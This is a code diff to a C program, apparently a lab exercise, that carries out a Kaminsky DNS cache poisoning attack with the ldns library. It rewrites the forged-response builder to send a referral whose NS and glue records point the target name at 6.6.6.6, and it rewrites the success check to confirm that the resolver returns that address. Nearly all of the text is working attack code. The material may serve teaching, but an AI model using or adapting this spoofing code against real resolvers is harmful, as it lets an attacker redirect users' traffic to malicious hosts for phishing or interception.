@@ -474,17 +474,18 @@ static int learn_resolver_source_port(void)
 
 /**
  * build_spoofed_response - Create malicious DNS response for Kaminsky attack
- * @qname: Query name being spoofed (e.g., www.example0.cybercourse.example.com)
+ * @qname: Query name being spoofed (e.g., ww0.example1.cybercourse.example.com)
  * @txid_guess: Guessed transaction ID to match resolver's query
  * @out_buf: Output buffer for serialized DNS packet (caller must free)
  * @out_len: Output length of serialized packet
  *
- * Builds a DNS response that includes:
- * - Answer section: A record for the queried domain
- * - Authority section: NS record claiming cybercourse.example.com delegates to attacker
- * - Additional section: A record mapping attacker's NS to malicious IP (6.6.6.6)
+ * Builds a referral DNS response (Kaminsky payload) that includes:
+ * - Answer section: EMPTY (referral response)
+ * - Authority section: NS record claiming www.example1.cybercourse.example.com is the NS
+ * - Additional section: Glue A record mapping www.example1... to 6.6.6.6 (THE POISON!)
  *
- * This is the core Kaminsky payload that poisons the cache.
+ * This matches the classic Kaminsky attack where the target domain becomes its own
+ * nameserver with a poisoned glue record.
  *
  * Returns: 0 on success, -1 on failure
  */
@@ -494,7 +495,6 @@ static int build_spoofed_response(const char *qname,
                                   size_t *out_len)
 {
     ldns_pkt *response = NULL;
-    ldns_rr *answer_rr = NULL;
     ldns_rr *authority_rr = NULL;
     ldns_rr *additional_rr = NULL;
     ldns_status status;
@@ -530,29 +530,23 @@ static int build_spoofed_response(const char *qname,
     ldns_pkt_push_rr(response, LDNS_SECTION_QUESTION, question);
     ldns_pkt_set_qdcount(response, 1);
 
-    // Answer section: A record for the queried domain
-    answer_rr = ldns_rr_new();
-    ldns_rr_set_owner(answer_rr, ldns_dname_new_frm_str(qname));
-    ldns_rr_set_type(answer_rr, LDNS_RR_TYPE_A);
-    ldns_rr_set_class(answer_rr, LDNS_RR_CLASS_IN);
-    ldns_rr_set_ttl(answer_rr, 86400); // 24 hours TTL
-    ldns_rr_push_rdf(answer_rr, ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "1.2.3.4"));
-    ldns_pkt_push_rr(response, LDNS_SECTION_ANSWER, answer_rr);
+    // Answer section: EMPTY (this is a referral response, not a direct answer)
+    // The resolver will cache the authority/additional sections
 
-    // Authority section: NS record for parent domain (Kaminsky payload)
-    // This is the critical part - claim cybercourse.example.com delegates to attacker
+    // Authority section: NS record claiming www.example1.cybercourse.example.com is the NS
+    // This is the Kaminsky trick - make the TARGET domain appear as the nameserver
     authority_rr = ldns_rr_new();
     ldns_rr_set_owner(authority_rr, ldns_dname_new_frm_str("example1.cybercourse.example.com"));
     ldns_rr_set_type(authority_rr, LDNS_RR_TYPE_NS);
     ldns_rr_set_class(authority_rr, LDNS_RR_CLASS_IN);
     ldns_rr_set_ttl(authority_rr, 86400);
-    ldns_rr_push_rdf(authority_rr, ldns_dname_new_frm_str("ns.example1.cybercourse.example.com"));
+    ldns_rr_push_rdf(authority_rr, ldns_dname_new_frm_str("www.example1.cybercourse.example.com"));
     ldns_pkt_push_rr(response, LDNS_SECTION_AUTHORITY, authority_rr);
 
-    // Additional section: A record for attacker's nameserver (glue record)
-    // This is what actually poisons the cache with the malicious IP
+    // Additional section: A record for www.example1.cybercourse.example.com (glue)
+    // This is the poison! When cached, www.example1... will resolve to 6.6.6.6
     additional_rr = ldns_rr_new();
-    ldns_rr_set_owner(additional_rr, ldns_dname_new_frm_str("ns.example1.cybercourse.example.com"));
+    ldns_rr_set_owner(additional_rr, ldns_dname_new_frm_str("www.example1.cybercourse.example.com"));
     ldns_rr_set_type(additional_rr, LDNS_RR_TYPE_A);
     ldns_rr_set_class(additional_rr, LDNS_RR_CLASS_IN);
     ldns_rr_set_ttl(additional_rr, 86400);
@@ -710,14 +704,15 @@ static void perform_attack_round(int round)
  * check_poisoning - Verify if DNS cache poisoning succeeded
  *
  * Queries the resolver for www.example1.cybercourse.example.com and checks
- * if the NS record in the authority section points to ns.example1.cybercourse.example.com.
- * This indicates the cache has been poisoned with our malicious delegation.
+ * if the A record points to 6.6.6.6 (our poisoned glue record).
+ * This indicates the cache has been successfully poisoned.
  *
  * Returns: 1 if poisoning succeeded, 0 otherwise
  */
 static int check_poisoning(void)
 {
     const char *test_domain = "www.example1.cybercourse.example.com";
+    const char *poison_ip = "6.6.6.6";
     int sockfd;
     struct sockaddr_in resolver_addr;
     ldns_pkt *query = NULL;
@@ -793,22 +788,26 @@ static int check_poisoning(void)
         goto cleanup;
     }
 
-    // Check authority section for ns.example1.cybercourse.example.com
-    ldns_rr_list *authority = ldns_pkt_authority(response);
-    if (authority) {
-        for (size_t i = 0; i < ldns_rr_list_rr_count(authority); i++) {
-            ldns_rr *rr = ldns_rr_list_rr(authority, i);
-            if (ldns_rr_get_type(rr) == LDNS_RR_TYPE_NS) {
-                ldns_rdf *ns_rdf = ldns_rr_rdf(rr, 0);
-                if (ns_rdf) {
-                    char *ns_str = ldns_rdf2str(ns_rdf);
-                    if (ns_str && strstr(ns_str, "ns.example1.cybercourse.example.com")) {
-                        printf("\n✓ Cache poisoning detected! NS record: %s\n", ns_str);
-                        poisoned = 1;
-                        free(ns_str);
-                        break;
+    // Check answer section for A record pointing to 6.6.6.6
+    ldns_rr_list *answer = ldns_pkt_answer(response);
+    if (answer) {
+        for (size_t i = 0; i < ldns_rr_list_rr_count(answer); i++) {
+            ldns_rr *rr = ldns_rr_list_rr(answer, i);
+            if (ldns_rr_get_type(rr) == LDNS_RR_TYPE_A) {
+                ldns_rdf *a_rdf = ldns_rr_rdf(rr, 0);
+                if (a_rdf) {
+                    char *ip_str = ldns_rdf2str(a_rdf);
+                    if (ip_str) {
+                        // Compare IP (strip trailing dot/whitespace if present)
+                        if (strncmp(ip_str, poison_ip, strlen(poison_ip)) == 0) {
+                            printf("\n✓ Cache poisoning SUCCESS! %s resolves to %s\n",
+                                   test_domain, ip_str);
+                            poisoned = 1;
+                            free(ip_str);
+                            break;
+                        }
+                        free(ip_str);
                     }
-                    if (ns_str) free(ns_str);
                 }
             }
         }
